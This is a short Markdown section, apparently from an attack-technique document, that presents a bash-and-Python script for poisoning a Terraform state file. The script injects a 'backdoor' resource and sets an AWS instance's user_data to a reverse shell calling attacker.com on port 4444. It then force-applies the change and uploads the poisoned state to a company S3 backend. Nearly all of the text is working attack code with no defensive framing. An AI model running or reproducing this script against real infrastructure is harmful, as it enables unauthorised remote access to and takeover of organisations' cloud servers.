## Vector B: State File Poisoning/Injection

### Direct State Manipulation Attack
```bash
#!/bin/bash
# state_poisoning.sh
# Direct JSON manipulation of Terraform state

STATE_FILE="terraform.tfstate"
BACKUP_FILE="${STATE_FILE}.backup"

# 1. Backup original state
cp "$STATE_FILE" "$BACKUP_FILE"

# 2. Parse and inject malicious resource
python3 -c "
import json
import sys

with open('$STATE_FILE', 'r') as f:
    state = json.load(f)

# Create malicious resource entry
malicious_resource = {
    'mode': 'managed',
    'type': 'null_resource',
    'name': 'backdoor',
    'provider': 'provider[\"registry.terraform.io/hashicorp/null\"]',
    'instances': [{
        'schema_version': 0,
        'attributes': {
            'id': '$(date +%s)',
            'triggers': {'timestamp': '$(date)'}
        }
    }]
}

# Add to resources
state['resources'].append(malicious_resource)

# Add malicious provisioner to existing resource
for resource in state['resources']:
    if resource['type'] == 'aws_instance' and resource['name'] == 'web_server':
        if 'instances' in resource and len(resource['instances']) > 0:
            # Inject reverse shell provisioner
            resource['instances'][0]['attributes']['user_data'] = '''#!/bin/bash
            bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
            '''
            break

with open('$STATE_FILE', 'w') as f:
    json.dump(state, f, indent=2)

print('State file poisoned successfully')
"

# 3. Execute malicious apply
terraform apply -auto-approve

# 4. Alternative: Inject via compromised backend
echo "Poisoning remote state..."
aws s3 cp terraform.tfstate s3://company-terraform-state/production/app/terraform.tfstate
```

